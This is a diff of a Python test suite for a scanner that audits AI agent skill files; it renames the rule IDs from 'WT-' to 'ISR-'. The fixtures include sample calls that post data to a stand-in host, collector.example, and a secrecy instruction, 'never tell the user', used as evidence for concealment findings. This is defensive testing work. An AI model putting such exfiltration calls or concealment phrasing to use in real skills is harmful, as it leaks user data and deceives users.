@@ -16,7 +16,7 @@ BODY = ("y" * 80 + "\n") * 55   # past the 4096 characters a crossing quote was 
 
 
 def rules_of(text, where="/s/SKILL.md"):
-    return {f["rule"] for f in wt.scan_text(text, where, wt.load_rules())} & {"WT-T005", "WT-T018"}
+    return {f["rule"] for f in wt.scan_text(text, where, wt.load_rules())} & {"ISR-T005", "ISR-T018"}
 
 
 # ---------------------------------------------------------------- 1: a sender's destination, not any argument named like one
@@ -27,30 +27,30 @@ class SenderDestination(Folder):
             ("python", "requests.post(url='https://collector.example/', headers={'X-Hook': '" + HOOK + "'})"),
             ("js", "fetch('https://collector.example/x', {method: 'POST', body: '" + HOOK + "'})"))
 
-    def test_the_codex_expression_is_critical(self):   # replay (aa771f5: Install with changes, WT-T018)
+    def test_the_codex_expression_is_critical(self):   # replay (aa771f5: Install with changes, ISR-T018)
         p = self.write("SKILL.md", HEAD + "```python\n" + self.CODEX + "\n```\n")
         code, r = vet_json(p)
         self.assertEqual(r["verdict"], "Do not install")
         # batch 6 (B7): vet shows the audit's labelled severity; the rule's own is severity_was
-        self.assertIn(("WT-T005", "critical"), [(f["rule"], f.get("severity_was", f["severity"])) for f in r["findings"]])
-        self.assertNotIn("WT-T018", [f["rule"] for f in r["findings"]])
+        self.assertIn(("ISR-T005", "critical"), [(f["rule"], f.get("severity_was", f["severity"])) for f in r["findings"]])
+        self.assertNotIn("ISR-T018", [f["rule"] for f in r["findings"]])
 
-    def test_a_chat_url_in_another_argument_of_a_sender_is_critical(self):   # replay (aa771f5: WT-T018 for each)
+    def test_a_chat_url_in_another_argument_of_a_sender_is_critical(self):   # replay (aa771f5: ISR-T018 for each)
         for lang, c in self.NEAR:
-            self.assertEqual(rules_of(HEAD + f"```{lang}\n" + c + "\n```\n"), {"WT-T005"}, c)
+            self.assertEqual(rules_of(HEAD + f"```{lang}\n" + c + "\n```\n"), {"ISR-T005"}, c)
 
     def test_the_url_a_call_sends_to_stays_a_chat_webhook(self):   # guard
         for lang, c in (("python", "requests.post('" + HOOK + "').raise_for_status()"),
                         ("python", "resp = requests.post('" + HOOK + "', json=payload)")):
-            self.assertEqual(rules_of(HEAD + f"```{lang}\n" + c + "\n```\n"), {"WT-T018"}, c)
-        # batch 7b: only requests/httpx/axios .post/.put/.patch/.get with the literal first is a recognised send (were WT-T018)
+            self.assertEqual(rules_of(HEAD + f"```{lang}\n" + c + "\n```\n"), {"ISR-T018"}, c)
+        # batch 7b: only requests/httpx/axios .post/.put/.patch/.get with the literal first is a recognised send (were ISR-T018)
         for lang, c in (("python", "urllib.request.urlopen(urllib.request.Request('" + HOOK + "', data=body))"),
                         ("python", "requests.request('POST', '" + HOOK + "')"),
                         ("python", "requests.post(url='" + HOOK + "')"),
                         ("js", "axios({url: '" + HOOK + "', method: 'post', data: body})"),
                         ("js", "await fetch('" + HOOK + "', {method: 'POST', body})"),
                         ("js", "fetch('" + HOOK + "').then(r => r.json())")):
-            self.assertEqual(rules_of(HEAD + f"```{lang}\n" + c + "\n```\n"), {"WT-T005"}, c)
+            self.assertEqual(rules_of(HEAD + f"```{lang}\n" + c + "\n```\n"), {"ISR-T005"}, c)
 
 
 # ---------------------------------------------------------------- 2: attached short options in the whole-word reader
@@ -179,11 +179,11 @@ class CountedPlatformSecret(_SignIn):
     def test_it_is_in_new_and_the_counts_with_its_own_fix(self):   # replay (aa771f5: only a platform note)
         p = self.setup_key()
         r = self.audit_json()
-        s1 = [f for f in self.mine(p) if f["rule"] == "WT-S001"]
+        s1 = [f for f in self.mine(p) if f["rule"] == "ISR-S001"]
         self.assertEqual(len(s1), 1)
         self.assertTrue(wt.counts(s1[0]))
         self.assertEqual(s1[0]["scope"], "platform")
-        mine = [f for f in r["new"] if f["rule"] == "WT-S001" and p in f["where"]]
+        mine = [f for f in r["new"] if f["rule"] == "ISR-S001" and p in f["where"]]
         self.assertEqual(len(mine), 1)
         self.assertIn("Revoke the key", mine[0]["fix"])
         self.assertGreaterEqual(r["open_by_severity"][s1[0]["severity"]], 1)
@@ -193,17 +193,17 @@ class CountedPlatformSecret(_SignIn):
         p = self.setup_key()
         self.audit()
         rows = self.breakdown()
-        self.assertTrue([l for l in rows.splitlines() if "WT-S001" in l and "Secret stored" in l])
+        self.assertTrue([l for l in rows.splitlines() if "ISR-S001" in l and "Secret stored" in l])
         md = self.report_md()
         table = md.split("## All open findings", 1)[1].split("\n## ", 1)[0]
-        self.assertIn("WT-S001", table)
+        self.assertIn("ISR-S001", table)
         page = self.dashboard()
         self.assertIn("Secret stored in a file", page.split("<h2", 1)[1].split("</table>", 1)[0])
 
     def test_daily_says_it_in_new(self):   # replay (aa771f5: a platform note)
         p = self.setup_key()
         r = self.daily_json()
-        self.assertTrue([f for f in r["new"] if f["rule"] == "WT-S001" and p in f["where"]], r)
+        self.assertTrue([f for f in r["new"] if f["rule"] == "ISR-S001" and p in f["where"]], r)
 
 
 # ---------------------------------------------------------------- 6: the installed copy is the one that runs
@@ -238,7 +238,7 @@ class InstalledCopyIdentity(Box):
 
     def plant(self):
         with open(os.path.join(self.app, wt.PLATFORM_REVIEWED_REL), "w") as f:
-            json.dump({"about": "planted", "entries": [{"paths": [REL], "sha256": "b" * 64, "rule": "WT-T005", "line": 3, "note": "Fine."}]}, f)
+            json.dump({"about": "planted", "entries": [{"paths": [REL], "sha256": "b" * 64, "rule": "ISR-T005", "line": 3, "note": "Fine."}]}, f)
         with open(os.path.join(self.app, wt.PLATFORM_NORMALIZE_REL), "w") as f:
             json.dump({"about": "planted", "entries": [{"path": ".grok/bundled/manifest.json", "fields": [{"key": ["skills"], "type": "hex_digest"}]}]}, f)
 
@@ -304,7 +304,7 @@ class CatalogProvenance(_SignIn):
         root = os.path.join(self.home, "sand-data", "plugins", "cache", "cursor-public", "p", "v1")
         os.makedirs(root)
         wt.save_json(wt.state_path("plugins.json"), {"p": {"since": wt.now(), "status": "catalog", "roots": [root]}})
-        f = dict(wt.finding("WT-T005", "Known exfiltration or tunnel host", "critical", [], os.path.join(root, "SKILL.md") + ":3", "e", "fix"),
+        f = dict(wt.finding("ISR-T005", "Known exfiltration or tunnel host", "critical", [], os.path.join(root, "SKILL.md") + ":3", "e", "fix"),
                  scope="platform", label=wt.CONFIRMED)
         self.assertTrue(wt.in_catalog_plugin(f["where"]))   # the catalog's, as before: never scored
         self.assertFalse(wt.counts(f))
@@ -312,7 +312,7 @@ class CatalogProvenance(_SignIn):
         self.assertEqual(wt.owners([f]), [f])
 
     def test_a_platform_root_is_still_a_note(self):   # guard
-        f = dict(wt.finding("WT-T008", "Secrecy or concealment instruction", "critical", [], os.path.join(self.home, REL) + ":12", "e", "fix"),
+        f = dict(wt.finding("ISR-T008", "Secrecy or concealment instruction", "critical", [], os.path.join(self.home, REL) + ":12", "e", "fix"),
                  scope="platform", label=wt.CONFIRMED)
         self.assertTrue(wt.platform_scope(f))
 
@@ -329,7 +329,7 @@ class ScannedBytes(_SignIn):
     def test_bytes_swapped_back_before_hashing_are_not_checked(self):   # replay (aa771f5: both checked notes)
         self.skills(1)
         good = self.sha(SIGNIN)
-        self.reviewed_file([self.entry(good, "WT-T008"), self.entry(good, "WT-T004")])
+        self.reviewed_file([self.entry(good, "ISR-T008"), self.entry(good, "ISR-T004")])
         bad_text = SIGNIN.replace(LINE12, MALICIOUS12)
         p = self.put(REL, SIGNIN)                 # the release lists the good bytes
         with open(p, "w") as f:
@@ -337,12 +337,12 @@ class ScannedBytes(_SignIn):
         real = wt.sha256_file
         with mock.patch.object(wt, "sha256_file", lambda q: good if q == p else real(q)):   # the good bytes are back for the hash
             self.audit()
-        got = {f["rule"]: f for f in self.mine(p) if f["rule"] in ("WT-T008", "WT-T004") and not f.get("guarded")}
-        self.assertEqual(set(got), {"WT-T008", "WT-T004"})
+        got = {f["rule"]: f for f in self.mine(p) if f["rule"] in ("ISR-T008", "ISR-T004") and not f.get("guarded")}
+        self.assertEqual(set(got), {"ISR-T008", "ISR-T004"})
         for f in got.values():
             self.assertNotEqual(f["label"], "Platform note (checked)")
             self.assertNotEqual(f["severity"], "info")
-        self.assertTrue([f for f in self.mine(p) if f["rule"] in ("WT-I001", "WT-I002") and wt.counts(f)])
+        self.assertTrue([f for f in self.mine(p) if f["rule"] in ("ISR-I001", "ISR-I002") and wt.counts(f)])
         self.assertNotIn("_snap", json.dumps(self.snap()))
 
     def test_one_read_gives_the_text_and_its_hash(self):   # guard
@@ -358,13 +358,13 @@ class ScannedBytes(_SignIn):
 # ---------------------------------------------------------------- 9 and 10: owner findings first; platform notes say what they leave out
 def plat(home, i, sev="critical"):
     title = f"Secrecy or concealment instruction number {i} " + "with a long explanation of what it says " * 8
-    return dict(wt.finding("WT-T008", title.strip(), sev, ["ASI06"], os.path.join(home, ".grok", "bundled", "skills", f"s{i}", "SKILL.md") + ":3",
+    return dict(wt.finding("ISR-T008", title.strip(), sev, ["ASI06"], os.path.join(home, ".grok", "bundled", "skills", f"s{i}", "SKILL.md") + ":3",
                            "never tell the user", "fix"), scope="platform", label=wt.CONFIRMED, **{"class": "evidence"})
 
 
 class OwnerFirst(_SignIn):
     def owner_high(self):
-        return dict(wt.finding("WT-I002", "A new file appeared in your own skill folder", "high", ["AST09"],
+        return dict(wt.finding("ISR-I002", "A new file appeared in your own skill folder", "high", ["AST09"],
                                os.path.join(self.home, "sand-data", "workflows", "w", "SKILL.md"), "abc123", "Look at it before using the skill."),
                     label=wt.CONFIRMED)
 
